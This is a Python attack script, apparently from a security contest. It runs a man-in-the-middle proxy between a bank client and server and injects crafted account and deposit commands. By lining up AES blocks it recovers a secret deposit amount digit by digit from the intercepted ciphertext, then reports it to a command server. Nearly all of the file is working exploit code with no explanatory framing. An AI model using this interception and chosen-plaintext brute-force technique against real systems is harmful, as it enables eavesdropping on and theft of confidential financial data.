#!/usr/bin/env python3
import socket
import argparse
import threading
import signal
import json
import requests
import sys
import time
from queue import Queue
from contextlib import contextmanager

CLIENT2SERVER = 1
SERVER2CLIENT = 2

running = True

"""
"fast" AES brute-force
@author: Hung Nguyen
"""

MAX_AMOUNT_LEN = 9
AES_BLOCK_SIZE = 32  # in char
NUM_PREFIX_BLOCK = 3

NEW_COMMAND_FORMAT = '{ "type": "input",' \
                     ' "input":{"input": ["-p","%PORT%","-i","%IP%",' \
                     '"-c","%IM_FILE%","-a","%IM_ACCOUNT%","-n","%IM_AMOUNT%"],"base64": false}}'
DEPOSIT_COMMAND_FORMAT = '{ "type": "input",' \
                         ' "input":{"input": ["-p","%PORT%","-i","%IP%",' \
                         '"-c","%IM_FILE%","-a","%IM_ACCOUNT%","-d","%IM_AMOUNT%"],"base64": false}}'

amount_detected = ''
cur_amount_len = 0
next_digit = 0

cur_file = 0
cur_file_name = None
cur_account = 0
cur_account_name = None

cur_state = 0       # 0: init, 1: sent acc created, 2: sent acc deposit, 3: failed, 4: finished
cur_buffer = None


def log(m):
    print(m, file=sys.stderr)


def send_command(shared):
    global cur_state
    global amount_detected
    global cur_amount_len
    global next_digit
    global cur_file
    global cur_file_name
    global cur_account
    global cur_account_name

    json_command = None

    if cur_state == 0:
        cur_file += 1
        cur_file_name = str(cur_file).zfill(2)
        cur_account += 1
        cur_account_name = str(cur_account).zfill(NUM_PREFIX_BLOCK * AES_BLOCK_SIZE - 70 - cur_amount_len - 1)
        json_command = NEW_COMMAND_FORMAT.replace('%IM_FILE%', cur_file_name)\
            .replace('%IM_ACCOUNT%', cur_account_name).replace('%IM_AMOUNT%', '10.30')

        log("[MITM]: sending new: %s" % json_command)
    elif cur_state == 1:
        json_command = DEPOSIT_COMMAND_FORMAT.replace('%IM_FILE%', cur_file_name) \
            .replace('%IM_ACCOUNT%', cur_account_name).replace('%IM_AMOUNT%', '%AMOUNT%')

        log("[MITM]: sending dep: %s" % json_command)
    elif cur_state == 2:
        if next_digit >= 10:
            if cur_amount_len < MAX_AMOUNT_LEN:
                log("[MITM] found amount: %s" % amount_detected)
                cur_state = 4
                finish = {"type": "learned", "variable": "amount", "secret": int(amount_detected)}
                shared.put(finish, block=True)
                time.sleep(1)
                finish = {"type": "done"}
                shared.put(finish, block=True)
            else:
                cur_state = 3
                log("[MITM] failed to brute-force")
                json_command = '{"type": "done"}'
        else:
            amount = amount_detected + str(next_digit) + '.30'
            json_command = DEPOSIT_COMMAND_FORMAT.replace('%IM_FILE%', cur_file_name) \
                .replace('%IM_ACCOUNT%', cur_account_name).replace('%IM_AMOUNT%', amount)

            log("[MITM]: sending guess: %s" % json_command)
            next_digit += 1

    # send to command server
    command = json.loads(json_command)
    shared.put(command, block=True)


def mitm(buff, direction, shared):
    global cur_state
    global amount_detected
    global cur_amount_len
    global next_digit
    global cur_buffer

    hb = "".join("{:02x}".format(c) for c in buff)

    if direction == CLIENT2SERVER:
        buffer_length = NUM_PREFIX_BLOCK * AES_BLOCK_SIZE // 3 * 4  # base64 equivalent
        if cur_state == 0:
            cur_state += 1
            send_command(shared)
        elif cur_state == 1:
            cur_state += 1
            log("[MITM] storing %s bytes buffer" % str(buffer_length))
            cur_buffer = buff[:buffer_length]
            send_command(shared)
        elif cur_state == 2:
            if buff[:buffer_length] == cur_buffer:
                log("[MITM] found next digit: %s" % str(next_digit - 1))
                amount_detected += str(next_digit - 1)
                cur_amount_len += 1
                if cur_amount_len < MAX_AMOUNT_LEN:
                    next_digit = 0
                    cur_state = 0
                    send_command(shared)
                else:
                    log("[MITM] found amount: %s" % amount_detected)
                    cur_state = 4
                    finish = {"type": "learned", "variable": "amount", "secret": int(amount_detected)}
                    shared.put(finish, block=True)
                    time.sleep(1)
                    finish = {"type": "done"}
                    shared.put(finish, block=True)

            else:
                send_command(shared)

        log("-> %s ->" % hb)
    elif direction == SERVER2CLIENT:
        log("<- %s <-" % hb)

    return buff


@contextmanager
def ignored(*exceptions):
    try:
        yield
    except exceptions:
        pass


def kill_p(a, b):
    with ignored(Exception):
        a.shutdown(socket.SHUT_RDWR)
        a.close()
        b.shutdown(socket.SHUT_RDWR)
        b.close()
    return


def worker(client, server, n, shared):
    while running:
        b = ""
        with ignored(Exception):
            b = client.recv(4096)
        if len(b) == 0:
            kill_p(client, server)
            return
        try:
            b = mitm(b, n, shared)
        except Exception:
            pass
        try:
            server.send(b)
        except Exception:
            pass
            kill_p(client, server)
            return
    kill_p(client, server)
    return


def signal_handler(sn, sf):
    global running
    running = False


def do_proxy_main(port, remote_host, remote_port):
    signal.signal(signal.SIGTERM, signal_handler)
    workers = []
    p = None

    global bank_address
    global bank_port

    bank_address = args.s
    bank_port = args.q

    try:
        shared = Queue()
        p = threading.Thread(target=send_input, args=(args.c, args.d, shared))
        p.start()

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(("0.0.0.0", port))
        s.listen(1)
        send_command(shared)
        while running:
            k, a = s.accept()
            v = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            v.connect((remote_host, remote_port))
            t1 = threading.Thread(target=worker, args=(k, v, CLIENT2SERVER, shared))
            t2 = threading.Thread(target=worker, args=(v, k, SERVER2CLIENT, shared))
            t2.start()
            t1.start()
            workers.append((t1, t2, k, v))
    except Exception:
        pass
        signal_handler(None, None)
    for t1, t2, k, v in workers:
        kill_p(k, v)
        t1.join()
        t2.join()
    p.join()
    return


def send_input(host, port, shared):
    global running
    while running:
        try:
            d = shared.get(block=True, timeout=1)
            time.sleep(1)
            r = requests.post("http://" + host + ":" + str(port), data={'REQUEST': json.dumps(d)})
            log(r.text)
        except Exception:
            pass
            time.sleep(1)


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Proxy')
    parser.add_argument('-p', type=int, default=4000, help="listen port")
    parser.add_argument('-s', type=str, default="127.0.0.1", help="server ip address")
    parser.add_argument('-q', type=int, default=3000, help="server port")
    parser.add_argument('-c', type=str, default="127.0.0.1", help="command server")
    parser.add_argument('-d', type=int, default=5000, help="command port")
    args = parser.parse_args()
    print("started")
    sys.stdout.flush()
    do_proxy_main(args.p, args.s, args.q)
